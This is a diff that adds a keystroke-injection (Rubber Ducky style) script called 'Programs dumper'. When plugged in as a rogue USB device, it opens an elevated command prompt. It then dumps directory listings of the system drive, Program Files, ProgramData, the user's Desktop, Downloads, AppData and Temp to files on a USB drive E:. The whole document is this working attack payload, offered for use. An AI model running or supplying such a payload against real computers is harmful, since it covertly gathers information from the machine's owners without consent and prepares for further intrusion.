@@ -1,0 +1,72 @@
+REM Programs dumper by Russanandres v1.0
+REM This script collects the names of folders and files from all popular places in the system
+REM WARNING! you need a USB flash drive letter E:\ to get files!
+
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -verb runAs
+ENTER
+DELAY 2500
+STRING mkdir E:\Programs_on_%COMPUTERNAME%
+ENTER
+STRING cd ../../..
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\systemdrive.txt
+ENTER
+DELAY 300
+STRING cd %ProgramData%
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\ProgramData.txt
+ENTER
+DELAY 300
+STRING cd %ProgramFiles%
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\ProgramFiles.txt
+ENTER
+DELAY 300
+STRING cd %ProgramFiles(x86)%
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\ProgramFiles86.txt
+ENTER
+DELAY 300
+STRING cd %USERPROFILE%
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\Userprofile.txt
+ENTER
+DELAY 300
+STRING cd %USERPROFILE%\Downloads
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\Downloads.txt
+ENTER
+DELAY 300
+STRING cd %USERPROFILE%\Desktop
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\Desktop.txt
+ENTER
+DELAY 300
+STRING cd %USERPROFILE%\AppData
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\LocalAppdata.txt
+ENTER
+DELAY 300
+STRING cd %AppData%
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\RoamingAppata.txt
+ENTER
+DELAY 300
+STRING cd %TMP%
+ENTER
+DELAY 300
+STRING dir /w > E:\Programs_on_%COMPUTERNAME%\TEMP.txt
+ENTER
+STRING exit
+ENTER
